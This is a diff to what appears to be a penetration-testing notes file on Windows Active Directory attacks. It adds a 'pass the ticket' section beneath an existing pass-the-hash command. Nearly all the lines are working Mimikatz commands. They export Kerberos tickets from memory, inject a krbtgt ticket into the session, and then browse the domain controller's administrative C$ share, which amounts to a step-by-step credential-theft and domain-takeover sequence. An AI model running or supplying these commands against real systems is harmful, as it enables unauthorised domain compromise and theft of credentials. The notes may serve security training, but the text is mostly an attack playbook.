@@ -161,7 +161,18 @@ To use administrator's NTLM hash and get administrative access
 C:\> powershell -ep bypass
 C:\> . .\Invoke-Mimikatz.ps1
 C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:842750294802902c23u2i /run:powershell.exe"'
+_______________________________________________________________________________________________________________________________________________________________________________________________
+Pass the ticket with powershell
+-------------------------------
+The approved steps are the same with pass the hash (pth)
+[seclogs.research.Security.local]: PS C:\> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+[seclogs.research.Security.local]: PS C:\> ls | select name
+[seclogs.research.Security.local]: PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt [0;2938a]-2-0-410000-maintkrbtgt-Research.security.local.kirbi"'
+[seclogs.research.Security.local]: PS C:\> klist
 
-
+Finally we got the domain controller
+------------------------------------
+[seclogs.research.Security.local]: PS C:\> ls \\prod.research.security.local\C$
+_______________________________________________________________________________________________________________________________________________________________________________________________
 
 
